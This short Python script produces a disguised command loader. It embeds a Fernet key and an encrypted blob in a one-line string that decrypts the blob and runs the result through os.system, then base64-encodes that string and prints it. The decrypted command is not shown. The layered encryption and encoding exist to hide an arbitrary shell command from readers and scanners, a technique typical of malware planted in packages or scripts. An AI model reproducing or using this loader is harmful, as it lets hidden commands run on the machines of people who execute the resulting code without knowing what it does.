import base64

command = """from cryptography.fernet import Fernet; import os; key=b'KFLulEYl-2XPiApCP5vAcPXAkSDJ8mDtt9icObaaJA8='; encrypted_command=b'gAAAAABnR1D_BugKRyllLXiCBEVEkhAtiSnFFVd6Xz7O39xNZLgadPcimqh38HPZh_34T1eYAZUeL0_IVG9N-Trr9xDGG2vOuqSBgF6QqYOzsekbXP3EmyljYlNRD1j6myqb0qvlNtjPnr6aQm4TpeURlgZlDvENlwLhup7XiME9SzCe_n-8v30JeemIMLmGRBG5ZC9XHN70HwTigSR-QK-sUZEdkutIqH6rBmwJSL0gF162QWvPP3VyfX3N1ZgGber5myQGFwe0QaQXM94qvqWWRqOaMX5gWiIQm8oslui-cZdbKO7hFkY_elVQsPWj5qCPPM9sEWqObUrqhN8tzqnoZLXns5Y684R9CHDS0BCXXNkei-mw-WLIWYcgLjfJPIlEyMrQNB62iX-yQubpiCnj1cnx7heQw4vZF2aUA6yAZSl-w1Gc5BWEwlp4QyBxumgV_X_hNmK3rbLzNgpMie4qPvFXi1HBZcczyqrSDjk968d1aV2ij0W1sUR3Ieg14GTkh6FgmBTk6yJDDJ0qKFgIsfZUPuhuvQ=='; cipher_suite=Fernet(key); decoded_command=cipher_suite.decrypt(encrypted_command).decode(); os.system(decoded_command)"""
encoded_command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
print(encoded_command)